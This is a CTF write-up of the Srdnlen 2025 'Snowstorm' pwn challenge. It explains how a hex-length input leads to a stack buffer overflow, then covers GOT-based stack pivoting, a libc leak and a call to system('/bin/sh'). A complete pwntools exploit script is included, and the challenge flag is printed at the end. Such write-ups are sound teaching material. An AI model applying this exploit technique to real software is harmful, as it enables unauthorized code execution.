---
date: '2025-01-21T18:50:00Z'
draft: false
title: 'Srdnlen 2025 - Snowstorm'
summary: "Interesting pwn challenge regarding the exploitation of a simple stack BOF."

categories: ["Writeups"]
tags: ["pwn", "bof", "stack pivoting"]
author: "about:blankets"
ShowToc: true
---

> Most of the challenge was solved by @Lotus

## Overview

This challenge is really straight forward, stripping it down we get this:
```c
int len; // eax
_BYTE buf[40]; // [rbp-30h]
int v3; // [rbp-8h]
int fd; // [rbp-4h]

fd = check_open("./flag.txt", 0);
v3 = print_flag(fd); // sends the flag to /dev/null

len = ask_length();
read(0, buf, len);
close(fd);
close(v3);

return
```

## Vulnerability

Turns out that ask_length handles also hexadecimal numbers, so `0x40` can be passed as a length and thus we get a BOF.

Mitigations are on our side as well:
```
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

## Exploitation

**Wrapping it up**: we have a BOF of 24 bytes and we need to exploit it in order to leak libc and call system.

The path we took was the following:
#### Stack pivoting
1. Pivot the stack over the GOT
2. Jump back to `call ask_length` to gain BOF once more, but this time we write on the GOT
#### Leak libc
1. Overwrite `close@got` with the address of `call puts` at `pwnme+73`
2. As RBP points to the GOT we can trick the binary into believing that local variables reside on the GOT, thus we change `int fd` to the address of `puts@got`
3. When `close(fd)` gets called we end up with `puts(&puts@plt)`, this leaks libc and we can BOF once more

#### RCE

Applying the same strategy we used to leak libc we can call `system("/bin/sh")`. We actually ended up calling `do_system+2` to avoid stack unalignment pain.

#### Final Exploit
```python
#!/bin/env python3

import sys
from pwn import *

context.terminal = ["alacritty", "--working-directory", "./", "-e"]
elf = context.binary = ELF("./snowstorm_patched", False)
libc = ELF("./libc.so.6", False)
gs = \
"""
b *pwnme+155
continue
"""

def start(argv):
    if args.REMOTE:
        if len(argv) != 2:
            print(f"Usage:\t{argv[0]} <IP>:<PORT> REMOTE")
            return -1
        (IP, PORT) = argv[1].split(":")
        return remote(IP, int(PORT))
    elif args.GDB:
        return gdb.debug(elf.path, gs, aslr=False)
    else:
        return process(elf.path)

def main(argv):
    global io
    io = start(argv)
    if io == -1:
        return -1

    """
    0x404020 <close@got[plt]>:	0x0000000000401070	0x0000000000401080
    0x404030 <read@got[plt]>:	0x0000000000401090	0x00000000004010a0
    0x404040 <sendfile@got[plt]>:	0x00000000004010b0	0x00000000004010c0
    0x404050 <open@got[plt]>:	0x00000000004010d0	0x00000000004010e0
    0x404060 <sleep@got[plt]>:	0x00000000004010f0	0x0000000000000000
    0x404070:	0x0000000000000000	0x0000000000000000
    """

    io.sendafter(b"40): ", b"0x40")
    payload = b"A" * 0x30
    payload += p64(elf.got.close+0x30) # pivot stack into the got
    # `call ask_lenght`, so we can overflow again, we write at rbp-0x30
    payload += p64(elf.sym.pwnme+83)
    io.sendafter(b"> ", payload)
    io.sendafter(b"40): ", b"0x40")

    # override close@got with `call puts` (rerun BOF)
    payload = p64(elf.sym.pwnme+73) 
    payload += p64(0x401080)
    payload += p64(0x401090)
    payload += p64(0x4010a0)
    payload += p64(0x4010b0)

    # this overrides `int fd`
    # when close(fd) is called we get puts(&puts@plt)
    payload += p64((elf.got.puts<<32))
    payload += p64(0x4010d0)
    payload += p64(0x4010e0)
    io.sendafter(b"> ", payload)

    # leak libc
    libc.address = u64(io.recvline(False).ljust(8, b"\0")) - libc.sym.puts
    success(f"Libc base: {hex(libc.address)}")
    io.sendafter(b"40): ", b"0x40")

    # override close@got with do_system+2
    payload = p64(libc.address + 0x582c2)
    payload += p64(0x401080)
    payload += p64(0x401090)
    payload += p64(0x4010a0)
    payload += p64(0x4010b0)

    # this overrides `int fd`
    # when close(fd) is called we get system("/bin/sh")
    payload += p64((elf.got.close+0x30) << 32)
    payload += b"/bin/sh\0"
    io.sendafter(b"> ", payload)

    io.interactive()


if __name__ == "__main__":
    sys.exit(main(sys.argv))
```
 
**FLAG**: `srdnlen{39.22N_9.12E_4nd_I'll_C0n71Nu3_70_7R4n5M1t_7h15_M355463}`
